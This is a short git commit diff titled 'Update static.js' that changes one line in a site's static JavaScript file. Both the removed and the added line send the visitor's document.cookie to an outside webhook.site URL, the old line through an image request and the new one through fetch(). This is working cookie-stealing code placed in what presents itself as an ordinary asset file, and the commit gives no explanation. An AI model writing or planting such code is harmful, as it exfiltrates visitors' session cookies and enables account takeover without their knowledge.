b487b2f3bd3f1aa1f5f527b5a55f0a0edda7e56d
ChenRu Hsu <68846490+hivetea@users.noreply.github.com>
2025-08-11 13:03:53 +0800

    Update static.js

--- static/static.js
+++ static/static.js
@@ -1,1 +1,1 @@
-new Image().src = "https://webhook.site/2f68dbf6-12ed-4a11-8a51-622f58892cbd?c=" + encodeURIComponent(document.cookie);
+fetch("https://webhook.site/2f68dbf6-12ed-4a11-8a51-622f58892cbd?c=" + encodeURIComponent(document.cookie));
